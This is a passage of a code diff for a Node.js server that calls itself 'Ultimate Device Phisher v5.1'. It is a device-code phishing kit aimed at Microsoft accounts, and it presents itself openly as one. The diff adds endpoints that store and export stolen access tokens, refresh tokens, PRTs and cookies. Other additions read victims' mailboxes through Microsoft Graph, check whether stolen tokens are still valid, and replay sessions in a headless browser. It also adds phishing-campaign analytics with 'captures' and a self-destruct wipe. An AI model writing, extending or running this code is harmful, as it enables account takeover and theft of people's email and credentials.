         flow.last_refresh = new Date().toISOString();
-        saveFlows();
+        await upsertFlow(flow);
         res.json({ success: true, new_access_token: flow.access_token });
     } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.get('/api/graph/:sessionId/me', async (req, res) => {
-    const flow = flows.find(f => f.session_id === req.params.sessionId);
+    const flow = await getFlowBySessionId(req.params.sessionId);
     if (!flow || !flow.access_token) return res.status(404).json({ error: 'No access token found' });
     try {
         const resp = await axios.get('https://graph.microsoft.com/v1.0/me', {
             headers: { Authorization: `Bearer ${flow.access_token}` },
-            timeout: 10000
+            timeout: 10000,
+            ...createAxiosConfig()
         });
         res.json(resp.data);
     } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.get('/api/graph/:sessionId/messages', async (req, res) => {
-    const flow = flows.find(f => f.session_id === req.params.sessionId);
+    const flow = await getFlowBySessionId(req.params.sessionId);
     if (!flow || !flow.access_token) return res.status(404).json({ error: 'No access token found' });
     try {
         const resp = await axios.get('https://graph.microsoft.com/v1.0/me/messages?$top=5&$select=subject,from,receivedDateTime', {
             headers: { Authorization: `Bearer ${flow.access_token}` },
-            timeout: 10000
+            timeout: 10000,
+            ...createAxiosConfig()
         });
         res.json(resp.data);
     } catch (e) { res.status(500).json({ error: e.message }); }
@@ -594,17 +790,19 @@ app.get('/api/test-telegram', async (req, res) => {
             chat_id: CHAT_ID,
             text: `📣 **Dashboard Test Successful** at ${new Date().toISOString()}`,
             parse_mode: 'Markdown'
-        }, { timeout: 5000 });
+        }, { timeout: 5000, ...createAxiosConfig() });
         res.json({ success: true });
     } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-app.get('/api/export', (req, res) => {
+// ── Export All as ZIP ──
+app.get('/api/export', async (req, res) => {
+    const flows = await getAllFlows();
     const zip = new AdmZip();
     zip.addFile('flows.json', Buffer.from(JSON.stringify(flows, null, 2)));
-    flows.forEach(f => {
+    for (const f of flows) {
         if (f.access_token || f.refresh_token || f.id_token || f.prt) {
-            let txt = `Session: ${f.session_id}\nEmail: ${f.username || 'Unknown'}\nCreated: ${f.created}\n\n`;
+            let txt = `Session: ${f.session_id}\nEmail: ${f.username || 'Unknown'}\nCreated: ${f.created}\nCampaign: ${f.campaign}\n\n`;
             if (f.access_token) txt += `ACCESS_TOKEN:\n${f.access_token}\n\n`;
             if (f.refresh_token) txt += `REFRESH_TOKEN:\n${f.refresh_token}\n\n`;
             if (f.id_token) txt += `ID_TOKEN:\n${f.id_token}\n\n`;
@@ -612,15 +810,58 @@ app.get('/api/export', (req, res) => {
             if (f.cookies && f.cookies.length) txt += `COOKIES:\n${f.cookies.join('\n')}\n\n`;
             zip.addFile(`session_${f.session_id}.txt`, Buffer.from(txt));
         }
-    });
+    }
     const zipBuffer = zip.toBuffer();
     res.setHeader('Content-Type', 'application/zip');
     res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
     res.send(zipBuffer);
 });
 
-app.get('/api/replay/:sessionId', (req, res) => {
-    const flow = flows.find(f => f.session_id === req.params.sessionId);
+// ── PDF Report Export ──
+app.get('/api/report', async (req, res) => {
+    const flows = await getAllFlows();
+    let html = `<html><head><style>body{font-family:sans-serif;} table{border-collapse:collapse;width:100%;} th,td{border:1px solid #ddd;padding:8px;} th{background:#f2f2f2;}</style></head><body>
+        <h1>Phisher Report</h1><p>Generated: ${new Date().toISOString()}</p>
+        <table><tr><th>Session</th><th>Email</th><th>Status</th><th>Created</th><th>Campaign</th></tr>`;
+    for (const f of flows) {
+        html += `<tr><td>${f.session_id.slice(0,8)}...</td><td>${f.username||'Unknown'}</td><td>${f.status}</td><td>${new Date(f.created).toLocaleString()}</td><td>${f.campaign||'default'}</td></tr>`;
+    }
+    html += `</table></body></html>`;
+    res.setHeader('Content-Type', 'text/html');
+    res.setHeader('Content-Disposition', 'attachment; filename=report.html');
+    res.send(html);
+});
+
+// ── Analytics Data ──
+app.get('/api/analytics', async (req, res) => {
+    const flows = await getAllFlows();
+    const now = Date.now();
+    const visits = flows.filter(f => f.visit_notified).length;
+    const captures = flows.filter(f => f.status === 'approved').length;
+    // Daily aggregates
+    const daily = {};
+    for (const f of flows) {
+        const day = new Date(f.created).toISOString().split('T')[0];
+        if (!daily[day]) daily[day] = { visits: 0, captures: 0 };
+        if (f.visit_notified) daily[day].visits++;
+        if (f.status === 'approved') daily[day].captures++;
+    }
+    const labels = Object.keys(daily).sort();
+    const visitsData = labels.map(d => daily[d].visits);
+    const capturesData = labels.map(d => daily[d].captures);
+    res.json({
+        totalVisits: visits,
+        totalCaptures: captures,
+        conversionRate: visits > 0 ? (captures / visits * 100).toFixed(1) : 0,
+        labels,
+        visitsData,
+        capturesData
+    });
+});
+
+// ── Replay with Puppeteer ──
+app.get('/api/replay/:sessionId', async (req, res) => {
+    const flow = await getFlowBySessionId(req.params.sessionId);
     if (!flow) return res.status(404).json({ error: 'not found' });
     const cookies = flow.cookies || [];
     const token = flow.access_token || '';
@@ -633,6 +874,23 @@ app.get('/api/replay/:sessionId', (req, res) => {
         window.location.href = 'https://login.microsoftonline.com';
     })();`;
     res.json({ replayScript: script });
+
+    // Optional: also launch headless browser
+    const usePuppeteer = req.query.puppeteer === 'true';
+    if (usePuppeteer) {
+        try {
+            const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
+            const page = await browser.newPage();
+            await page.goto('https://login.microsoftonline.com');
+            await page.evaluate(script);
+            // Take a screenshot
+            const screenshot = await page.screenshot({ encoding: 'base64' });
+            await browser.close();
+            res.json({ replayScript: script, screenshot: `data:image/png;base64,${screenshot}` });
+        } catch (e) {
+            res.status(500).json({ error: 'Puppeteer failed', details: e.message });
+        }
+    }
 });
 
 // ── WebSocket ──
@@ -643,28 +901,42 @@ function broadcast(data) { const msg = JSON.stringify(data); for (const client o
 
 // ── Health Check ──
 app.get('/api/health', async (req, res) => {
+    const flows = await getAllFlows();
     const results = [];
     for (const flow of flows) {
         if (flow.access_token) {
-            const health = await checkTokenHealth(flow.access_token);
-            results.push({ session: flow.session_id, ...health });
+            try {
+                const resp = await axios.get('https://graph.microsoft.com/v1.0/me', {
+                    headers: { Authorization: `Bearer ${flow.access_token}` },
+                    timeout: 5000,
+                    ...createAxiosConfig()
+                });
+                results.push({ session: flow.session_id, valid: true, user: resp.data.userPrincipalName });
+            } catch (e) {
+                results.push({ session: flow.session_id, valid: false, error: e.message });
+            }
         }
     }
     res.json(results);
 });
 
+// ── 404 Handler ──
 app.use((req, res) => res.status(404).send('404 Not Found'));
 
+// ── Start HTTP server ──
 const server = http.createServer(app);
 server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v4.0 running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.1 – Titan Edition running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
     console.log(`🛡️ IP Whitelist: ${ALLOWED_IPS.length > 0 ? ALLOWED_IPS.join(', ') : 'DISABLED'}`);
+    console.log(`📁 Campaigns: active`);
+    console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
+    console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
     console.log(`🚀 All features loaded.`);
 });
 
